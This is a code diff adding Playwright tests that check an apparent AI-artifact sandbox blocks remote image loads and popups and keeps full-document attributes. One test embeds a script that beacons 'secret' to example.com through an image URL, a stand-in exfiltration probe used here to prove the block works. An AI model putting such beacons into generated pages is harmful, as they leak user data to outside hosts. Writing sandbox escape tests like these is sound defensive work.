@@ -65,6 +65,43 @@ test.describe('Artifacts', () => {
     await expect(html).toHaveAttribute('data-theme', await appTheme());
   });
 
+  test('more escapes are blocked: remote images and popups', async ({ page, request }) => {
+    const html = [
+      '<p>img: <span id="img">pending</span> · popup: <span id="popup">pending</span></p>',
+      '<script>',
+      'document.addEventListener("securitypolicyviolation", (e) => {',
+      '  if (e.violatedDirective.startsWith("img-src")) img.textContent = "blocked";',
+      '});',
+      'const probe = new Image();',
+      'probe.onload = () => { img.textContent = "open" };',
+      'probe.onerror = () => { img.textContent = "blocked" };',
+      'probe.src = "https://example.com/pixel.png?d=secret";',
+      'popup.textContent = window.open("https://example.com/") ? "open" : "blocked";',
+      '</script>',
+    ].join('');
+    // WebKit fires no securitypolicyviolation for it: no response is the proof
+    // (Chromium reports the refused request itself, which never reaches the network)
+    const remote: string[] = [];
+    page.on('response', (r) => {
+      if (r.url().includes('example.com')) remote.push(r.url());
+    });
+    await artifactTurn(page, request, { title: 'Probes', html });
+    await expect(frameOf(page).locator('#img')).toHaveText('blocked', { timeout: 15000 });
+    expect(remote).toEqual([]);
+    await expect(frameOf(page).locator('#popup')).toHaveText('blocked');
+    expect(page.context().pages()).toHaveLength(1);
+  });
+
+  test('a full document keeps its body attributes and window load listeners', async ({ page, request }) => {
+    const html =
+      '<!doctype html><html lang="cs"><body class="recipe"><p id="o">-</p>' +
+      '<script>window.addEventListener("DOMContentLoaded", () => { o.textContent = document.body.className })</script>' +
+      '</body></html>';
+    await artifactTurn(page, request, { title: 'Doc', html });
+    await expect(frameOf(page).locator('#o')).toHaveText('recipe', { timeout: 15000 });
+    await expect(frameOf(page).locator('html')).toHaveAttribute('lang', 'cs');
+  });
+
   test('a button in the artifact sends a message as the user', async ({ page, request }) => {
     await artifactTurn(page, request, { title: 'Svíčková', html: KITCHEN_SINK });
     // A send while the reply is still running is refused ("Please wait..."):
